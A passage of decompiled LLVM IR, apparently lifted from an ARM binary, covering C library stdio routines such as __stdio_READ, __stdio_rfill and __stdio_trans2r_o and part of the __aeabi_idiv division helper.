  %v1_1bc9c = phi i32 [ %v1_1bc6c, %dec_label_pc_1bc6c ], [ %v1_1bc88, %dec_label_pc_1bc84 ]
  %v2_1bc9c = sub i32 %v1_1bc9c, %v0_1bc74
  ret i32 %v2_1bc9c

; uselistorder directives
  uselistorder i32 %v6_1bc84, { 1, 0 }
  uselistorder i32 %v1_1bc84, { 2, 1, 0 }
  uselistorder i32 %v0_1bc5c, { 0, 2, 1 }
  uselistorder i8 0, { 65, 17, 25, 26, 66, 16, 22, 67, 68, 47, 72, 70, 46, 71, 69, 45, 40, 9, 10, 73, 74, 78, 79, 24, 61, 62, 75, 76, 77, 15, 80, 41, 48, 82, 0, 81, 49, 42, 83, 84, 85, 86, 87, 88, 23, 1, 2, 89, 11, 52, 93, 3, 91, 90, 50, 4, 92, 51, 5, 94, 95, 27, 6, 97, 96, 53, 98, 99, 100, 101, 43, 102, 104, 105, 103, 12, 13, 14, 106, 7, 107, 28, 108, 18, 109, 19, 63, 29, 30, 8, 110, 111, 112, 114, 115, 116, 117, 113, 44, 118, 119, 120, 121, 122, 20, 31, 32, 33, 34, 35, 36, 124, 123, 37, 125, 126, 38, 127, 54, 21, 128, 129, 130, 132, 133, 55, 134, 135, 131, 136, 137, 138, 139, 141, 140, 142, 145, 143, 144, 146, 149, 147, 148, 150, 64, 151, 152, 153, 154, 171, 172, 168, 169, 170, 166, 167, 164, 165, 162, 163, 160, 161, 156, 157, 158, 159, 155, 173, 174, 175, 176, 177, 178, 179, 180, 182, 181, 184, 183, 185, 56, 187, 186, 39, 188, 57, 189, 191, 192, 190, 58, 193, 194, 60, 195, 59, 196, 197, 198, 199, 200, 201, 202, 203 }
  uselistorder i32 192, { 0, 4, 1, 5, 2, 6, 3 }
}

define i32 @__stdio_READ(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1bca4 = load i32, i32* @r4, align 4
  store i32 %v3_1bca4, i32* %stack_var_-12, align 4
  %v3_1bca8 = load i8, i8* %arg1, align 1
  %v4_1bca8 = zext i8 %v3_1bca8 to i32
  store i32 %v4_1bca8, i32* %r3.global-to-local, align 4
  %v1_1bcac = and i32 %v4_1bca8, 4
  store i32 %v1_1bcac, i32* %r5.global-to-local, align 4
  %v2_1bcac = icmp eq i32 %v1_1bcac, 0
  store i1 %v2_1bcac, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_1bcac, label %bb8, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_1bca4, i32* @r4, align 4
  ret i32 0

bb8:                                              ; preds = %entry
  %v1_1bcbc = icmp slt i32 %arg2, 0
  %v2_1bcbc = icmp eq i32 %arg2, 0
  store i1 %v2_1bcbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_1bcbc, label %bb9, label %bb10

bb9:                                              ; preds = %bb8
  store i32 2147483647, i32* @r2, align 4
  br label %bb10

bb10:                                             ; preds = %bb8, %bb9
  %v1_1bcc4 = add i32 %tmp, 4
  %v2_1bcc4 = inttoptr i32 %v1_1bcc4 to i32*
  %v3_1bcc4 = load i32, i32* %v2_1bcc4, align 4
  store i32 %v3_1bcc4, i32* %r0.global-to-local, align 4
  %v1_1bcc8 = call i32 @__libc_read(i32 %v3_1bcc4)
  store i32 %v1_1bcc8, i32* %r0.global-to-local, align 4
  %v2_1bccc = icmp eq i32 %v1_1bcc8, 0
  store i1 %v2_1bccc, i1* %cpsr_z.global-to-local, align 1
  %tmp11 = icmp slt i32 %v1_1bcc8, 1
  br i1 %tmp11, label %bb13, label %bb12

bb12:                                             ; preds = %bb10
  %v7_1bcd0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_1bcd0, i32* @r4, align 4
  ret i32 %v1_1bcc8

bb13:                                             ; preds = %bb10
  %v0_1bcd4 = load i32, i32* @r4, align 4
  %v1_1bcd4 = inttoptr i32 %v0_1bcd4 to i32*
  %v2_1bcd4 = load i32, i32* %v1_1bcd4, align 4
  %v1_1bcd8 = or i32 %v2_1bcd4, 8
  store i32 %v1_1bcd8, i32* %r1.global-to-local, align 4
  %v1_1bcdc = or i32 %v2_1bcd4, 4
  store i32 %v1_1bcdc, i32* %r3.global-to-local, align 4
  %v3_1bce0 = sdiv i32 %v2_1bcd4, 256
  store i32 %v3_1bce0, i32* %ip.global-to-local, align 4
  br i1 %v2_1bccc, label %.thread, label %bb14

bb14:                                             ; preds = %bb13
  %v1_1bce8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_1bce8, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread:                                          ; preds = %bb13
  %v2_1bcec = trunc i32 %v3_1bce0 to i8
  %v4_1bcec = add i32 %v0_1bcd4, 1
  %v5_1bcec = inttoptr i32 %v4_1bcec to i8*
  store i8 %v2_1bcec, i8* %v5_1bcec, align 1
  %v0_1bcf0.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1bcf0.pr, label %.thread1, label %.thread2

.thread1:                                         ; preds = %.thread
  %v1_1bcf0 = load i32, i32* %r3.global-to-local, align 4
  %v2_1bcf0 = trunc i32 %v1_1bcf0 to i8
  %v3_1bcf0 = load i32, i32* @r4, align 4
  %v4_1bcf0 = inttoptr i32 %v3_1bcf0 to i8*
  store i8 %v2_1bcf0, i8* %v4_1bcf0, align 1
  %v0_1bcf4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1bcf4.pr.pr, label %.thread3, label %.thread2

.thread2:                                         ; preds = %bb14, %.thread, %.thread1
  %v1_1bcf4 = load i32, i32* %ip.global-to-local, align 4
  %v2_1bcf4 = trunc i32 %v1_1bcf4 to i8
  %v3_1bcf4 = load i32, i32* @r4, align 4
  %v4_1bcf4 = add i32 %v3_1bcf4, 1
  %v5_1bcf4 = inttoptr i32 %v4_1bcf4 to i8*
  store i8 %v2_1bcf4, i8* %v5_1bcf4, align 1
  %v0_1bcf8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1bcf8.pr, label %.thread3, label %bb15

bb15:                                             ; preds = %.thread2
  %v1_1bcf8 = load i32, i32* %r1.global-to-local, align 4
  %v2_1bcf8 = trunc i32 %v1_1bcf8 to i8
  %v3_1bcf8 = load i32, i32* @r4, align 4
  %v4_1bcf8 = inttoptr i32 %v3_1bcf8 to i8*
  store i8 %v2_1bcf8, i8* %v4_1bcf8, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %.thread2, %bb15
  %v2_1bcfc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1bcfc, i32* @r4, align 4
  %v11_1bcfc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_1bcfc

; uselistorder directives
  uselistorder i32 %v3_1bce0, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 5, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 (i32)* @__libc_read, { 1, 0 }
  uselistorder i32 2147483647, { 2, 3, 0, 1 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1bd00 = load i32, i32* @r4, align 4
  store i32 %v3_1bd00, i32* %stack_var_-8, align 4
  %v1_1bd04 = add i32 %arg1, 8
  %v1_1bd08 = inttoptr i32 %v1_1bd04 to i32*
  %v2_1bd08 = load i32, i32* %v1_1bd08, align 4
  store i32 %v2_1bd08, i32* @r1, align 4
  %v3_1bd08 = add i32 %arg1, 12
  %v4_1bd08 = inttoptr i32 %v3_1bd08 to i32*
  %v5_1bd08 = load i32, i32* %v4_1bd08, align 4
  %v2_1bd0c = sub i32 %v5_1bd08, %v2_1bd08
  store i32 %v2_1bd0c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_1bd14 = inttoptr i32 %arg1 to i8*
  %v4_1bd14 = call i32 @__stdio_READ(i8* %v3_1bd14, i32 %v2_1bd08, i32 %v2_1bd0c)
  %v0_1bd18 = load i32, i32* @r4, align 4
  %v1_1bd18 = add i32 %v0_1bd18, 8
  %v2_1bd18 = inttoptr i32 %v1_1bd18 to i32*
  %v3_1bd18 = load i32, i32* %v2_1bd18, align 4
  store i32 %v3_1bd18, i32* %r2.global-to-local, align 4
  %v2_1bd1c = add i32 %v3_1bd18, %v4_1bd14
  %v2_1bd20 = add i32 %v0_1bd18, 20
  %v3_1bd20 = inttoptr i32 %v2_1bd20 to i32*
  store i32 %v2_1bd1c, i32* %v3_1bd20, align 4
  %v0_1bd24 = load i32, i32* %r2.global-to-local, align 4
  %v1_1bd24 = load i32, i32* @r4, align 4
  %v2_1bd24 = add i32 %v1_1bd24, 16
  %v3_1bd24 = inttoptr i32 %v2_1bd24 to i32*
  store i32 %v0_1bd24, i32* %v3_1bd24, align 4
  %v2_1bd28 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1bd28, i32* @r4, align 4
  ret i32 %v4_1bd14

; uselistorder directives
  uselistorder i32 %v4_1bd14, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1bd2c = load i32, i32* @r4, align 4
  store i32 %v3_1bd2c, i32* %stack_var_-12, align 4
  %v0_1bd30 = load i32, i32* @r0, align 4
  %v1_1bd30 = inttoptr i32 %v0_1bd30 to i8*
  %v2_1bd30 = load i8, i8* %v1_1bd30, align 1
  %v3_1bd30 = zext i8 %v2_1bd30 to i32
  store i32 %v3_1bd30, i32* %r2.global-to-local, align 4
  %v1_1bd34 = add i32 %v0_1bd30, 1
  %v2_1bd34 = inttoptr i32 %v1_1bd34 to i8*
  %v3_1bd34 = load i8, i8* %v2_1bd34, align 1
  %v4_1bd34 = zext i8 %v3_1bd34 to i32
  store i32 %v4_1bd34, i32* %r3.global-to-local, align 4
  %v4_1bd38 = mul nuw nsw i32 %v4_1bd34, 256
  %v5_1bd38 = or i32 %v4_1bd38, %v3_1bd30
  store i32 %v5_1bd38, i32* %r2.global-to-local, align 4
  %v1_1bd3c = load i32, i32* @r1, align 4
  %v2_1bd3c = and i32 %v1_1bd3c, %v5_1bd38
  %v4_1bd3c = icmp eq i32 %v2_1bd3c, 0
  store i32 %v0_1bd30, i32* @r4, align 4
  br i1 %v4_1bd3c, label %dec_label_pc_1bd48, label %dec_label_pc_1bd60

dec_label_pc_1bd48:                               ; preds = %entry
  %v1_1bd48 = and i32 %v5_1bd38, 2176
  %v2_1bd48 = icmp eq i32 %v1_1bd48, 0
  br i1 %v2_1bd48, label %dec_label_pc_1bd50, label %dec_label_pc_1bd74

dec_label_pc_1bd50:                               ; preds = %dec_label_pc_1bd48
  %v2_1bd50 = or i32 %v1_1bd3c, %v5_1bd38
  store i32 %v2_1bd50, i32* %r2.global-to-local, align 4
  %v3_1bd54 = sdiv i32 %v2_1bd50, 256
  store i32 %v3_1bd54, i32* %r3.global-to-local, align 4
  %v1_1bd58 = trunc i32 %v3_1bd54 to i8
  store i8 %v1_1bd58, i8* %v2_1bd34, align 1
  %v0_1bd5c = load i32, i32* %r2.global-to-local, align 4
  %v1_1bd5c = trunc i32 %v0_1bd5c to i8
  %v2_1bd5c = load i32, i32* @r0, align 4
  %v3_1bd5c = inttoptr i32 %v2_1bd5c to i8*
  store i8 %v1_1bd5c, i8* %v3_1bd5c, align 1
  %v0_1bd60.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1bd60

dec_label_pc_1bd60:                               ; preds = %entry, %dec_label_pc_1bd50
  %v0_1bd60 = phi i32 [ %v0_1bd30, %entry ], [ %v0_1bd60.pre, %dec_label_pc_1bd50 ]
  %v1_1bd60 = inttoptr i32 %v0_1bd60 to i8*
  %v2_1bd60 = load i8, i8* %v1_1bd60, align 1
  %v3_1bd60 = zext i8 %v2_1bd60 to i32
  store i32 %v3_1bd60, i32* %r2.global-to-local, align 4
  %v1_1bd64 = add i32 %v0_1bd60, 1
  %v2_1bd64 = inttoptr i32 %v1_1bd64 to i8*
  %v3_1bd64 = load i8, i8* %v2_1bd64, align 1
  %v4_1bd64 = zext i8 %v3_1bd64 to i32
  %v4_1bd68 = mul nuw nsw i32 %v4_1bd64, 256
  %v5_1bd68 = or i32 %v4_1bd68, %v3_1bd60
  store i32 %v5_1bd68, i32* %r3.global-to-local, align 4
  %v1_1bd6c = and i32 %v3_1bd60, 16
  store i32 %v1_1bd6c, i32* %r5.global-to-local, align 4
  %v2_1bd6c = icmp eq i32 %v1_1bd6c, 0
  br i1 %v2_1bd6c, label %dec_label_pc_1bd9c, label %dec_label_pc_1bd74

dec_label_pc_1bd74:                               ; preds = %dec_label_pc_1bd48, %dec_label_pc_1bd60
  %v0_1bd74 = call i32 @__errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1bd7c = inttoptr i32 %v0_1bd74 to i32*
  store i32 9, i32* %v2_1bd7c, align 4
  br label %dec_label_pc_1bd80

dec_label_pc_1bd80:                               ; preds = %dec_label_pc_1bda4, %dec_label_pc_1bd74
  %v0_1bd80 = load i32, i32* @r4, align 4
  %v1_1bd80 = inttoptr i32 %v0_1bd80 to i32*
  %v2_1bd80 = load i32, i32* %v1_1bd80, align 4
  %v1_1bd84 = or i32 %v2_1bd80, 8
  store i32 %v1_1bd84, i32* %r3.global-to-local, align 4
  %v3_1bd88 = sdiv i32 %v2_1bd80, 256
  store i32 %v3_1bd88, i32* %r2.global-to-local, align 4
  %v1_1bd90 = trunc i32 %v3_1bd88 to i8
  %v3_1bd90 = add i32 %v0_1bd80, 1
  %v4_1bd90 = inttoptr i32 %v3_1bd90 to i8*
  store i8 %v1_1bd90, i8* %v4_1bd90, align 1
  %v0_1bd94 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bd94 = trunc i32 %v0_1bd94 to i8
  %v2_1bd94 = load i32, i32* @r4, align 4
  %v3_1bd94 = inttoptr i32 %v2_1bd94 to i8*
  store i8 %v1_1bd94, i8* %v3_1bd94, align 1
  %v2_1bd98 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1bd98, i32* @r4, align 4
  ret i32 -1

dec_label_pc_1bd9c:                               ; preds = %dec_label_pc_1bd60
  %v1_1bd9c = and i32 %v3_1bd60, 64
  %v2_1bd9c = icmp eq i32 %v1_1bd9c, 0
  br i1 %v2_1bd9c, label %dec_label_pc_1bdcc, label %dec_label_pc_1bda4

dec_label_pc_1bda4:                               ; preds = %dec_label_pc_1bd9c
  %v0_1bda4 = call i32 @__stdio_wcommit()
  %v2_1bda8 = icmp eq i32 %v0_1bda4, 0
  br i1 %v2_1bda8, label %dec_label_pc_1bdb0, label %dec_label_pc_1bd80

dec_label_pc_1bdb0:                               ; preds = %dec_label_pc_1bda4
  %v0_1bdb0 = load i32, i32* @r4, align 4
  %v1_1bdb0 = inttoptr i32 %v0_1bdb0 to i32*
  %v2_1bdb0 = load i32, i32* %v1_1bdb0, align 4
  store i32 %v2_1bdb0, i32* %r3.global-to-local, align 4
  %v1_1bdb4 = add i32 %v0_1bdb0, 8
  %v2_1bdb4 = inttoptr i32 %v1_1bdb4 to i32*
  %v3_1bdb4 = load i32, i32* %v2_1bdb4, align 4
  store i32 %v3_1bdb4, i32* %r2.global-to-local, align 4
  %v1_1bdb8 = and i32 %v2_1bdb0, -65
  store i32 %v1_1bdb8, i32* %r3.global-to-local, align 4
  %v3_1bdbc = sdiv i32 %v2_1bdb0, 256
  store i32 %v3_1bdbc, i32* %r1.global-to-local, align 4
  %v2_1bdc0 = add i32 %v0_1bdb0, 28
  %v3_1bdc0 = inttoptr i32 %v2_1bdc0 to i32*
  store i32 %v3_1bdb4, i32* %v3_1bdc0, align 4
  %v0_1bdc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1bdc4 = trunc i32 %v0_1bdc4 to i8
  %v2_1bdc4 = load i32, i32* @r4, align 4
  %v3_1bdc4 = add i32 %v2_1bdc4, 1
  %v4_1bdc4 = inttoptr i32 %v3_1bdc4 to i8*
  store i8 %v1_1bdc4, i8* %v4_1bdc4, align 1
  %v0_1bdc8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bdc8 = trunc i32 %v0_1bdc8 to i8
  %v2_1bdc8 = load i32, i32* @r4, align 4
  %v3_1bdc8 = inttoptr i32 %v2_1bdc8 to i8*
  store i8 %v1_1bdc8, i8* %v3_1bdc8, align 1
  %v0_1bdcc.pre = load i32, i32* @r4, align 4
  %v0_1bdd8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1bdcc

dec_label_pc_1bdcc:                               ; preds = %dec_label_pc_1bd9c, %dec_label_pc_1bdb0
  %v0_1bdd8 = phi i32 [ 0, %dec_label_pc_1bd9c ], [ %v0_1bdd8.pre, %dec_label_pc_1bdb0 ]
  %v2_1bddc = phi i32 [ %v0_1bd60, %dec_label_pc_1bd9c ], [ %v0_1bdcc.pre, %dec_label_pc_1bdb0 ]
  %v1_1bdcc = inttoptr i32 %v2_1bddc to i32*
  %v2_1bdcc = load i32, i32* %v1_1bdcc, align 4
  %v1_1bdd0 = or i32 %v2_1bdcc, 1
  store i32 %v1_1bdd0, i32* %r3.global-to-local, align 4
  %v3_1bdd4 = sdiv i32 %v2_1bdcc, 256
  store i32 %v3_1bdd4, i32* %r2.global-to-local, align 4
  %v1_1bddc = trunc i32 %v3_1bdd4 to i8
  %v3_1bddc = add i32 %v2_1bddc, 1
  %v4_1bddc = inttoptr i32 %v3_1bddc to i8*
  store i8 %v1_1bddc, i8* %v4_1bddc, align 1
  %v0_1bde0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bde0 = trunc i32 %v0_1bde0 to i8
  %v2_1bde0 = load i32, i32* @r4, align 4
  %v3_1bde0 = inttoptr i32 %v2_1bde0 to i8*
  store i8 %v1_1bde0, i8* %v3_1bde0, align 1
  %v2_1bde4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1bde4, i32* @r4, align 4
  ret i32 %v0_1bdd8

; uselistorder directives
  uselistorder i32 %v3_1bdd4, { 1, 0 }
  uselistorder i32 %v3_1bd88, { 1, 0 }
  uselistorder i32 %v3_1bd60, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1bd60, { 0, 2, 1 }
  uselistorder i32 %v3_1bd54, { 1, 0 }
  uselistorder i32 %v5_1bd38, { 0, 2, 1, 3 }
  uselistorder i32 28, { 21, 22, 5, 6, 7, 23, 24, 25, 26, 38, 27, 29, 8, 28, 1, 30, 2, 31, 32, 33, 34, 35, 36, 0, 37, 16, 17, 18, 3, 4, 19, 13, 12, 10, 11, 14, 15, 9, 20 }
  uselistorder i32 ()* @__stdio_wcommit, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 64, { 5, 0, 6, 7, 8, 9, 10, 11, 12, 1, 2, 13, 3, 14, 4 }
  uselistorder i32 9, { 17, 22, 23, 24, 25, 26, 27, 18, 28, 16, 29, 30, 19, 31, 32, 33, 34, 35, 0, 15, 12, 13, 14, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 20, 21 }
  uselistorder i32 ()* @__errno_location, { 47, 46, 45, 73, 72, 71, 44, 43, 42, 41, 40, 39, 17, 30, 38, 37, 26, 56, 3, 2, 1, 23, 0, 22, 75, 55, 54, 62, 61, 70, 69, 68, 16, 53, 25, 28, 57, 52, 15, 32, 49, 63, 29, 33, 36, 35, 34, 4, 14, 51, 11, 10, 67, 31, 27, 66, 21, 9, 13, 5, 20, 12, 6, 50, 19, 18, 65, 64, 8, 7, 60, 59, 58, 74, 48, 24 }
  uselistorder label %dec_label_pc_1bdcc, { 1, 0 }
  uselistorder label %dec_label_pc_1bd74, { 1, 0 }
  uselistorder label %dec_label_pc_1bd60, { 1, 0 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1bde8 = icmp slt i32 %arg2, 0
  %v2_1bde8 = icmp eq i32 %arg2, 0
  %v0_1bdec = load i32, i32* @r0, align 4
  %v2_1bdec = xor i32 %v0_1bdec, %arg2
  br i1 %v2_1bde8, label %dec_label_pc_1bf00, label %dec_label_pc_1bdf4

dec_label_pc_1bdf4:                               ; preds = %entry
  br i1 %v1_1bde8, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_1bdf4
  %v2_1bdf4 = sub i32 0, %arg2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1bdf4, %bb
  %v1_1bec0 = phi i32 [ %v2_1bdf4, %bb ], [ %arg2, %dec_label_pc_1bdf4 ]
  %v1_1bdf8 = add i32 %v1_1bec0, -1
  %v7_1bdf8 = icmp eq i32 %v1_1bec0, 1
  br i1 %v7_1bdf8, label %dec_label_pc_1bea0, label %dec_label_pc_1be00

dec_label_pc_1be00:                               ; preds = %thread-pre-split
  %v1_1be00 = icmp slt i32 %v0_1bdec, 0
  br i1 %v1_1be00, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_1be00
  %v2_1be04 = sub i32 0, %v0_1bdec
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_1be00, %bb85
  %v0_1bef4 = phi i32 [ %v0_1bdec, %dec_label_pc_1be00 ], [ %v2_1be04, %bb85 ]
  %v3_1be08 = icmp uge i32 %v0_1bef4, %v1_1bec0
  %v9_1be08 = icmp eq i32 %v0_1bef4, %v1_1bec0
  %v2_1be0c = xor i1 %v3_1be08, true
  %v3_1be0c = or i1 %v9_1be08, %v2_1be0c
  br i1 %v3_1be0c, label %dec_label_pc_1beac, label %dec_label_pc_1be10

dec_label_pc_1be10:                               ; preds = %bb86
  %v2_1be10 = and i32 %v1_1bdf8, %v1_1bec0
  %v4_1be10 = icmp eq i32 %v2_1be10, 0
  br i1 %v4_1be10, label %dec_label_pc_1bebc, label %dec_label_pc_1be18

dec_label_pc_1be18:                               ; preds = %dec_label_pc_1be10
  %v3_1be18 = icmp ult i32 %v1_1bec0, 536870912
  br i1 %v3_1be18, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1be18
  %v4_1be1c = mul i32 %v1_1bec0, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1be18, %.thread
  %v0_1be3c.pr40.ph = phi i32 [ %v4_1be1c, %.thread ], [ %v1_1bec0, %dec_label_pc_1be18 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1be18 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_1be3c.pr40 = phi i32 [ %v4_1be30, %bb89 ], [ %v0_1be3c.pr40.ph, %.preheader.preheader ]
  %v1_1be34 = phi i32 [ %v4_1be34, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_1be28 = icmp ugt i32 %v0_1be3c.pr40, 268435455
  br i1 %v2_1be28, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1be3cthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_1be2c = icmp ult i32 %v0_1be3c.pr40, %v0_1bef4
  br i1 %v4_1be2c, label %bb88, label %dec_label_pc_1be3cthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_1be30 = and i32 %v0_1be3c.pr40, 268435456
  %v3_1be30 = icmp eq i32 %v2_1be30, 0
  %v4_1be30 = mul i32 %v0_1be3c.pr40, 16
  br i1 %v3_1be30, label %bb89, label %dec_label_pc_1be3c.loopexit

bb89:                                             ; preds = %bb88
  %v2_1be34 = and i32 %v1_1be34, 268435456
  %v3_1be34 = icmp eq i32 %v2_1be34, 0
  %v4_1be34 = mul i32 %v1_1be34, 16
  br i1 %v3_1be34, label %.preheader, label %dec_label_pc_1be3cthread-pre-split.loopexit.loopexit

dec_label_pc_1be3cthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1be4852.ph = phi i32 [ %v1_1be34, %bb87 ], [ %v4_1be34, %bb89 ]
  %v0_1be3c.pr42.ph = phi i32 [ %v0_1be3c.pr40, %bb87 ], [ %v4_1be30, %bb89 ]
  br label %dec_label_pc_1be3cthread-pre-split.loopexit

dec_label_pc_1be3cthread-pre-split.loopexit:      ; preds = %dec_label_pc_1be3cthread-pre-split.loopexit.loopexit, %.thread3
  %v1_1be4852 = phi i32 [ %v1_1be34, %.thread3 ], [ %v1_1be4852.ph, %dec_label_pc_1be3cthread-pre-split.loopexit.loopexit ]
  %v0_1be3c.pr42 = phi i32 [ %v0_1be3c.pr40, %.thread3 ], [ %v0_1be3c.pr42.ph, %dec_label_pc_1be3cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1be3cthread-pre-split

dec_label_pc_1be3cthread-pre-split:               ; preds = %dec_label_pc_1be3cthread-pre-split.loopexit, %bb91
  %v1_1be4850 = phi i32 [ %v1_1be4852, %dec_label_pc_1be3cthread-pre-split.loopexit ], [ %v3_1be48, %bb91 ]
  %v2_1be4048 = phi i32 [ %v0_1bef4, %dec_label_pc_1be3cthread-pre-split.loopexit ], [ %v2_1be40, %bb91 ]
  %v0_1be3c.pr = phi i32 [ %v0_1be3c.pr42, %dec_label_pc_1be3cthread-pre-split.loopexit ], [ %v3_1be44, %bb91 ]
  br label %dec_label_pc_1be3c

dec_label_pc_1be3c.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_1be3c

dec_label_pc_1be3c:                               ; preds = %dec_label_pc_1be3c.loopexit, %dec_label_pc_1be3cthread-pre-split
  %v1_1be48 = phi i32 [ %v1_1be4850, %dec_label_pc_1be3cthread-pre-split ], [ %v1_1be34, %dec_label_pc_1be3c.loopexit ]
  %v2_1be40 = phi i32 [ %v2_1be4048, %dec_label_pc_1be3cthread-pre-split ], [ %v0_1bef4, %dec_label_pc_1be3c.loopexit ]
  %v1_1be44 = phi i32 [ %v0_1be3c.pr, %dec_label_pc_1be3cthread-pre-split ], [ %v4_1be30, %dec_label_pc_1be3c.loopexit ]
  %v2_1be3c = icmp slt i32 %v1_1be44, 0
  br i1 %v2_1be3c, label %dec_label_pc_1be50, label %bb90

bb90:                                             ; preds = %dec_label_pc_1be3c
  %v4_1be40 = icmp ult i32 %v1_1be44, %v2_1be40
  br i1 %v4_1be40, label %bb91, label %dec_label_pc_1be50

bb91:                                             ; preds = %bb90
  %v3_1be44 = mul i32 %v1_1be44, 2
  %v2_1be48 = icmp slt i32 %v1_1be48, 0
  %v3_1be48 = mul i32 %v1_1be48, 2
  br i1 %v2_1be48, label %dec_label_pc_1be50, label %dec_label_pc_1be3cthread-pre-split

dec_label_pc_1be50:                               ; preds = %bb90, %dec_label_pc_1be3c, %bb91
  %v2_1be5c63 = phi i32 [ %v3_1be48, %bb91 ], [ %v1_1be48, %bb90 ], [ %v1_1be48, %dec_label_pc_1be3c ]
  %v1_1be5455 = phi i32 [ %v3_1be44, %bb91 ], [ %v1_1be44, %bb90 ], [ %v1_1be44, %dec_label_pc_1be3c ]
  br label %dec_label_pc_1be54

dec_label_pc_1be54:                               ; preds = %.thread13, %dec_label_pc_1be50
  %v1_1be88 = phi i32 [ %v4_1be88, %.thread13 ], [ %v2_1be5c63, %dec_label_pc_1be50 ]
  %v1_1be5c = phi i32 [ %v1_1be98, %.thread13 ], [ 0, %dec_label_pc_1be50 ]
  %v1_1be8c = phi i32 [ %v4_1be8c, %.thread13 ], [ %v1_1be5455, %dec_label_pc_1be50 ]
  %v1_1be58 = phi i32 [ %v0_1be84, %.thread13 ], [ %v0_1bef4, %dec_label_pc_1be50 ]
  %v3_1be54 = icmp ult i32 %v1_1be58, %v1_1be8c
  br i1 %v3_1be54, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_1be54
  %v3_1be58 = sub i32 %v1_1be58, %v1_1be8c
  %v3_1be5c = or i32 %v1_1be5c, %v1_1be88
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1be54, %bb92
  %v1_1be64 = phi i32 [ %v1_1be58, %dec_label_pc_1be54 ], [ %v3_1be58, %bb92 ]
  %v1_1be68 = phi i32 [ %v1_1be5c, %dec_label_pc_1be54 ], [ %v3_1be5c, %bb92 ]
  %v4_1be60 = udiv i32 %v1_1be8c, 2
  %v6_1be60 = icmp ult i32 %v1_1be64, %v4_1be60
  br i1 %v6_1be60, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_1be64 = urem i32 %v1_1be8c, 2
  %v4_1be64 = icmp eq i32 %v3_1be64, 0
  %v6_1be64 = sub i32 %v1_1be64, %v4_1be60
  br i1 %v4_1be64, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1be68 = udiv i32 %v1_1be88, 2
  %v6_1be68 = or i32 %v1_1be68, %v5_1be68
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
